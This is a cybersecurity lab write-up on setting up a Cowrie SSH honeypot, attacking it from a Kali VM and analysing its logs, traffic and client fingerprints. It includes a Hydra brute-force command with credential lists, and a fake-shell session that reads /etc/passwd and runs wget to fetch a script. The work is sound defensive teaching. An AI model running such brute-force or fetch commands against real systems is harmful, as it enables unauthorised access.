# Building an SSH Honeypot with Cowrie

**Author:** fabx-crypt
**Date:** October 23, 2026
**Type:** Cybersecurity lab project

## Summary

I built a small SSH honeypot with Cowrie inside VirtualBox and attacked it from a second VM to see what it records. The honeypot logged every login attempt, every command typed into its fake shell, a file downloaded through `wget`, and a fingerprint of the SSH client behind each connection. I also captured the traffic in Wireshark to compare what the network sees with what the honeypot sees.

This was a lab on a private network, so all the "attacks" came from me. It shows how a honeypot works and what data it produces, but it says nothing about real-world attacker behavior.

## What a honeypot does

A honeypot is a system that looks like a real target but has no real value. Anyone who connects to it is either lost or up to something, so every interaction is worth recording. Cowrie is a medium-interaction SSH and Telnet honeypot: it offers a fake Linux shell, accepts most logins, and logs everything the visitor does.

The flow is simple:

1. Run a fake SSH server.
2. Let it simulate a Linux environment.
3. Record login attempts and commands.
4. Analyze the activity to understand the attacker's behavior.

## Lab environment

| Role | VM | Address | Notes |
|---|---|---|---|
| Honeypot | Ubuntu Desktop | 192.168.56.105 | Runs Cowrie on port 2222 |
| Attacker | Kali Linux | 192.168.56.104 | Hydra, OpenSSH client, Wireshark |

Both VMs run in VirtualBox with two network adapters:

- **Adapter 1, NAT:** gives the VMs internet access for installing packages.
- **Adapter 2, Host-only:** a private network (192.168.56.0/24) where the attacker and the honeypot talk to each other.

Real SSH on the Ubuntu VM stays on port 22, and Cowrie listens on 2222, so the two don't clash.

**Software:** Cowrie 3.1.3, Python 3.14, jq, Hydra, Wireshark.

## Setup

### 1. Install dependencies and create a dedicated user

Cowrie refuses to run as root, so it gets its own user.

```bash
sudo apt update
sudo apt install -y git python3-venv python3-pip libssl-dev libffi-dev build-essential libpython3-dev authbind jq
sudo adduser --disabled-password --gecos "" cowrie
sudo su - cowrie
```

### 2. Install Cowrie

```bash
git clone https://github.com/cowrie/cowrie
cd cowrie
python3 -m venv cowrie-env
source cowrie-env/bin/activate
pip install --upgrade pip
pip install -r requirements.txt
pip install -e .
```

Older tutorials tell you to run `cp etc/cowrie.cfg.dist etc/cowrie.cfg` and start Cowrie with `bin/cowrie start`. That no longer works in Cowrie 3.x, where neither file exists in the checkout. The current way is to create a working directory and let Cowrie generate its own config.

### 3. Initialize and start

```bash
cd ~
mkdir my-honeypot
cd my-honeypot
cowrie init
cowrie start
```

`cowrie init` writes `etc/cowrie.cfg` and creates the `var/` folders for logs and downloads. Cowrie runs from whichever directory you start it in, so always run it from `~/my-honeypot`.

Check that it is listening:

```bash
ss -tlnp | grep 2222
ls var/log/cowrie
```

![Cowrie running](images/01-cowrie-running.png)

Cowrie is up on `0.0.0.0:2222` and has created `cowrie.json` and `cowrie.log`.

## Attacking the honeypot

### Manual login

From Kali:

```bash
ssh root@192.168.56.105 -p 2222
```

Cowrie accepted the login and dropped me into a fake shell called `svr04`. I ran five commands: `whoami`, `uname -a`, `ls /`, `cat /etc/passwd` and `wget http://example.com/test.sh`. The fake `/etc/passwd` even has an invented user.

On the left is the attacker's view, on the right is Cowrie's log with the same commands:

![Attacker and honeypot side by side](images/02-attack-session.png)

### Automated brute force

To get a burst of traffic, I ran Hydra with 6 usernames and 5 passwords against the honeypot. This was only ever pointed at my own VM.

```bash
printf "root\nadmin\nuser\ntest\nubuntu\npi\n" > users.txt
printf "123456\nroot\nletmein\npassword\nadmin123\n" > pass.txt
hydra -L users.txt -P pass.txt -s 2222 -t 4 ssh://192.168.56.105
```

## Analyzing the logs

Cowrie writes structured JSON to `var/log/cowrie/cowrie.json`, which is easy to query with `jq`. Every command below is run from `~/my-honeypot`.

### Logins

```bash
jq -r 'select(.eventid=="cowrie.login.failed" or .eventid=="cowrie.login.success") | .eventid' var/log/cowrie/cowrie.json | sort | uniq -c
```

| Result | Count |
|---|---|
| Successful logins | 23 |
| Failed logins | 2 |

The two failures were `root/root` and `root/123456`. Cowrie blocks those passwords for the root user by default and accepts almost anything else, which is what lures attackers into the fake shell. A real honeypot on the internet sees far more failures, because attackers try thousands of combinations.

Attempts per username, from the logs:

| Username | Attempts |
|---|---|
| root | 5 |
| user, ubuntu, test, pi, admin | 4 each |

`root` has one extra attempt because it includes my manual login.

![Login analysis](images/03-login-analysis.png)

### A note on Hydra's numbers

Hydra reported 30 attempts and "22 valid passwords found". Cowrie's log shows something slightly different: only four passwords per username arrived, and `admin123` never reached the honeypot at all (a search for it in the log returns nothing). I don't know why Hydra skipped that last password, so I treat the honeypot's log as the source of truth and use its numbers throughout this report.

### Commands typed

```bash
jq -r 'select(.eventid=="cowrie.command.input") | [.timestamp, .src_ip, .input] | @tsv' var/log/cowrie/cowrie.json
```

| Time (UTC) | Source IP | Command |
|---|---|---|
| 09:52:02 | 192.168.56.104 | `whoami` |
| 09:52:15 | 192.168.56.104 | `uname -a` |
| 09:53:22 | 192.168.56.104 | `ls /` |
| 09:53:51 | 192.168.56.104 | `cat /etc/passwd` |
| 09:55:14 | 192.168.56.104 | `wget http://example.com/test.sh` |

### Captured file

The `wget` was not faked. Cowrie really downloaded the file and stored it under `var/lib/cowrie/downloads/`, named after its SHA-256 hash. That is how real attackers' malware samples end up in a honeypot's download folder.

![Commands and downloaded file](images/04-commands-and-downloads.png)

The hash on disk matches the hash in the log, and `file` identifies the content as HTML. That fits, since `example.com/test.sh` doesn't exist and the server returned its 404 page.

![File hash check](images/05-file-hash.png)

With a real sample you would never run or open the file. You would look up the hash on VirusTotal, and do any deeper analysis only inside an isolated VM.

## Network capture with Wireshark

I captured traffic on the host-only interface (`eth1`) with the capture filter `tcp port 2222`.

### TCP handshake

The filter `tcp.flags.syn==1` shows the start of the connection: Kali sends a SYN to port 2222 and the honeypot answers with a SYN-ACK.

![TCP handshake](images/06-wireshark-handshake.png)

### SSH negotiation

With the filter `ssh` you can read the version banners and watch the key exchange:

- Kali announces `OpenSSH_10.3p1 Debian-5`.
- The honeypot answers with `OpenSSH_9.2p1 Debian-2+deb12u3`. That is Cowrie's fake identity, not the software actually running on the Ubuntu VM.
- After the key exchange, every packet is just "Encrypted packet".

![SSH packets](images/07-wireshark-ssh.png)

Following the TCP stream shows the same thing: two readable banners, the lists of algorithms each side supports, and then encrypted data.

![TCP stream](images/08-wireshark-tcp-stream.png)

### What the capture can and can't show

The capture cannot reveal the password or any commands, because SSH is encrypted end to end. Cowrie's log shows all of it, because the honeypot is the endpoint that decrypts the session. That is the main advantage of a honeypot over passive network monitoring.

The default banner is also a weakness. Experienced attackers fingerprint honeypots by their stock banners, and Cowrie lets you change the version string in `etc/cowrie.cfg`.

## Client fingerprints (HASSH)

Cowrie records a HASSH fingerprint for every connection. It is a hash of the algorithms the SSH client offers during negotiation, so it identifies the client software rather than the person using it.

```bash
jq -r 'select(.eventid=="cowrie.client.kex") | [.src_ip, .hassh] | @tsv' var/log/cowrie/cowrie.json | sort | uniq -c
```

Two fingerprints showed up, both from the same IP address:

| Fingerprint (start) | Connections | First seen (UTC) | Explanation |
|---|---|---|---|
| `eeca2460...` | 2 | 09:50 | My manual logins with the OpenSSH client |
| `015322ee...` | 25 | 10:11 | The Hydra run |

![HASSH first seen](images/09-hassh-first-seen.png)

The first-seen times line up with when I ran each tool, which is how I know which fingerprint belongs to which. The point for defenders is that a human using OpenSSH and an automated brute-forcer produce different fingerprints even from the same source address, which is how HASSH is used to group attackers.

One small oddity: Hydra's fingerprint appears on 25 connections while the log has 24 Hydra login attempts. I couldn't explain the extra connection, so I'm leaving it as an open question.

## Activity over time

```bash
jq -r 'select(.eventid=="cowrie.login.failed" or .eventid=="cowrie.login.success" or .eventid=="cowrie.command.input") | .timestamp[0:16]' var/log/cowrie/cowrie.json | sort | uniq -c
```

| Minute (UTC) | Events | What it was |
|---|---|---|
| 09:51 | 1 | Manual login |
| 09:52 | 2 | `whoami`, `uname -a` |
| 09:53 | 2 | `ls /`, `cat /etc/passwd` |
| 09:55 | 1 | `wget` |
| 10:11 | 24 | Hydra brute force |
| 10:46 | 2 | Second manual session (Wireshark capture) |
| 10:47 | 2 | Second manual session (Wireshark capture) |

Only minutes with activity are listed.

![Activity timeline](images/10-timeline.png)

The two kinds of behavior look very different. A human types a command every few seconds to minutes. Hydra produced 24 events in a single minute. Real automated attacks follow the same pattern at a larger scale, which makes the event rate a useful signal.

## Safety notes

- Run the honeypot inside a VM, never on a machine you use every day. Cowrie makes real outbound connections when a visitor runs `wget` or `curl`.
- Never run it as root.
- Keep real credentials off the honeypot and off the network it sits on.
- Only run Hydra or any other attack tool against systems you own.
- To collect real attack traffic, use a throwaway cloud VPS instead of forwarding ports from your home network. Move the real SSH service off port 22 first and redirect 22 to 2222.
- Treat captured files as hostile. Check hashes online and analyze samples only in an isolated environment.

## Limitations

- Everything here came from one source IP on a private network, so there is no real attacker data.
- The numbers are small, so the findings are demonstrations rather than statistics.
- Hydra's output and Cowrie's log disagreed slightly (the missing `admin123` attempts and one extra connection). I used the honeypot's log as the record.
- The Kali VM's clock was offset from the Ubuntu VM's. Cowrie logs in UTC, so I matched events by source IP and fingerprint rather than by clock time.

## Possible next steps

- Ship `cowrie.json` to Elasticsearch with Filebeat and build Kibana dashboards for failed logins, source IPs, usernames, commands and activity over time. The ELK stack is heavy, so give its VM at least 4 GB of RAM.
- Change Cowrie's banner and hostname so it is harder to fingerprint.
- Expose it on a cloud VPS and analyze real attack traffic.

## Tools used

Cowrie, Python, Linux (Ubuntu and Kali), VirtualBox, Hydra, Wireshark, jq.
